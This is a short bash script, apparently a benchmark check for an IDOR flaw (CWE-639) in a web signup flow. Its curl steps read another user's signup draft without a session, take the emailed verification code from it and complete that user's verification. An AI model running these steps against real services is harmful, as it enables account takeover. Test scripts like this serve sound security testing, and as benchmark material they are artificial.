#!/usr/bin/env bash
# SIGNUP-IDOR-001 (CWE-639): any draft is readable by id, unauthenticated, and
# the row carries the verification code emailed to somebody else.
set -e; . "$(dirname "$0")/_lib.sh"
VICTIM="victim-$$@bench.local"
VID=$(curl -s -X POST "$TARGET/api/signup/start" -H 'content-type: application/json' \
  -d "{\"email\":\"$VICTIM\"}" | json_get draftId)
[ -n "$VID" ]
# a stranger with no session reads the victim's draft
STOLE=$(curl -s "$TARGET/api/signup/draft/$VID")
echo "$STOLE" | grep -q "$VICTIM"
echo "$STOLE" | grep -q '"code"'
# and the stolen code completes the victim's verification
CODE=$(echo "$STOLE" | json_get code)
curl -s -X POST "$TARGET/api/signup/verify" -H 'content-type: application/json' \
  -d "{\"draftId\":$VID,\"code\":\"$CODE\"}" | grep -q '"ok":true'
